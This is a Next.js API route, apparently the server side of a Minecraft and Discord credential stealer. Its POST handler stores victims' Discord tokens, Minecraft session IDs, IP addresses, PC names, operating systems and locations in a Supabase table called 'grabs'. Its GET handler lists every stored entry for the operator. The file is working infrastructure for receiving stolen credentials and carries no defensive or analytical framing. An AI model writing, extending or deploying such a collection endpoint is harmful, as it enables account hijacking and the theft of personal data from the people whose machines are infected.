export const dynamic = 'force-dynamic';

import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';

function getClient() {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { cookies: { getAll() { return []; }, setAll() {} } }
  );
}

export async function GET() {
  const supabase = getClient();
  const { data, error } = await supabase
    .from('grabs')
    .select('*')
    .order('created_at', { ascending: false });

  if (error) {
    return NextResponse.json({ grabs: [], error: error.message });
  }
  return NextResponse.json({ grabs: data || [] });
}

export async function POST(request) {
  const body = await request.json();

  const {
    minecraft_username,
    discord_username,
    ip_address,
    country,
    timezone,
    os,
    pc_name,
    client_version,
    session_id,
    session_start,
    discord_token,
    servers,
    timestamp,
  } = body;

  if (!minecraft_username) {
    return NextResponse.json({ error: 'minecraft_username required' }, { status: 400 });
  }

  const supabase = getClient();

  const { data, error } = await supabase
    .from('grabs')
    .insert([{
      minecraft_username: minecraft_username || 'Unknown',
      discord_username: discord_username || 'Unknown',
      ip_address: ip_address || 'Unknown',
      country: country || 'Unknown',
      timezone: timezone || 'Unknown',
      os: os || 'Unknown',
      pc_name: pc_name || 'Unknown',
      client_version: client_version || 'Unknown',
      session_id: session_id || '',
      session_start: session_start || '',
      discord_token: discord_token || '',
      servers: servers || '',
    }])
    .select()
    .single();

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
  return NextResponse.json({ ok: true, id: data.id });
}
